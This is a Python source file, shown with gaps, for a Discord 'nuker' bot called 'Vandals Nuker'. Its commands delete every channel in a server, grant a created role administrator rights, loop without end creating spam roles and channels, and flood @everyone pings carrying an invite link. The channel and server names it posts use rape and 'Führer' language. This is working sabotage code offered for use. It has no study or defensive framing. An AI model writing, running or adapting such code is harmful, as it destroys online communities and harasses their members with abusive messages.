#Created By Rexden Don't Remove The Credits
#Vandals Nuker
...
async def d(ctx,channel_id="all"):
  ...
  if channel_id == "all":
    for channel in ctx.guild.channels:
      if channel.id != 1315940753142190080:
        await channel.delete()
      else:
        continue
    await ctx.guild.create_text_channel(name="Raped-By-Vandals-🖤")
...
async def admin(ctx):
    ...
    try:
        guild = ctx.guild
        role = await guild.create_role(name="Vandals Nuker", permissions=discord.Permissions(8),colour=discord.Colour(000000))
...
async def rspam(ctx):
 while True:
   await ctx.guild.create_role(name="VANDALS NUKER RUNS YOU")
   print("Spamming roles <3")
@bot.command()
async def transrspam(ctx):
 while True:
   await ctx.guild.create_role(name="VANDALS NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
   await ctx.guild.create_role(name="VANDALS NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="VANDALS NUKER RUNS YOU",colour=discord.Colour(0xFFA3FB))
   await ctx.guild.create_role(name="VANDALS NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="VANDALS NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
   print("Spamming roles <3")
@bot.command()
...
@bot.command()
async def cspam(ctx,amount=10,name_of_channel="Raped-By-Vandals-🖤"):
  await ctx.message.delete() 
...
@bot.command()
async def vcspam(ctx,amount=10,name_of_channel="Raped-By-Vandals-🖤"): 
  await ctx.message.delete()
  for times in range(amount):
...
async def help(ctx):
 await ctx.message.delete()
 embed1 = Embed(title="Vandals Nuker Help", color=0xaf1aff)
 ...
 embed1.set_image(url="https://cdn.discordapp.com/attachments/1289259167839817760/1315942191302180885/4a3a4b85c32a88a932f61d0effe48e4f.gif")     
 embed1.set_footer(text="By Vandals Führer ~ Rexden")
...
async def pingspam(ctx):
    await ctx.guild.edit(name="Raped By Vandals Führer 🖤")
    ...
    while True:
      ...
      try:
        await guild.create_text_channel("Raped-By-Vandals-🖤")
        await guild.create_voice_channel("Raped-By-Vandals-🖤")
      except:
        pass 
      for channel in ctx.guild.text_channels:
        try:
          webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
          await channel.send(f"Nuked! @everyone https://discord.gg/sCmkW3T8 VANDALS FÜHRER RUNS YOU         {r1}")
          await ctx.channel.create_webhook(name="Vandals By Rexden")
          await channel.send(f"Nuked! @everyone https://discord.gg/sCmkW3T8 VANDALS FÜHRER RUNS YOU   {r1}")
...
async def servername(ctx, name = None): 
  if name != None:
    ...
    await em1001.delete()
@bot.command()
async def nickall(ctx, *, name="! REXDEN RUNS YOU"):
  print("Nicking All")
